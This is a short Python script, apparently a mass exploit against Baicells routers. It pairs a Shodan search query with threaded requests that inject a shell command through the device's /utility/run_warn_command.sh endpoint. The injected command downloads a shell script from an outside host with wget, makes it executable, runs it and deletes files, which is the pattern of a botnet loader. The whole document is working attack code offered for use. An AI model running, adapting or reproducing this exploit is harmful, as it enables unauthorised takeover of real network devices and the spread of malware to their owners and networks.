#shodan - title:"Baicells Management Utility"
#exploit for the Baicell fiber router, running off the arm7 architecture.

#use python cell.py list.txt port threads (Number of threads = number of ip)

import requests
import sys
from threading import Thread

command = 'cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F1.1.1.1%2F1.sh%3B%20chmod%20777%20*%3B%20sh%201.sh%3B%20rm%20-rf%20'

file_path, port, thread_c = sys.argv[1:4]

thread_c = int(thread_c)

ips_list = (open(file_path, 'r').read().split('\n'))[:thread_c]


def loader():
    for ip in ips_list:
        Thread(target=main, args=(ip, )).start()

def main(ip):
    try:
        headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0"}
        r = requests.get("http://" + ip + ":" + port)
        if "Baicells Management Utility" in r.text:  
            print("found -> " + ip)
            req23 = requests.post("http://" + ip + ":" + port + "/utility/run_warn_command.sh", data="commands=S||" + command + "&hash=browser_time%3D1608466780") 
        
            print("Succes: %s" %(ip))
        else:
            print("Error: %s" %(ip))
    except Exception as c:
        pass
loader()
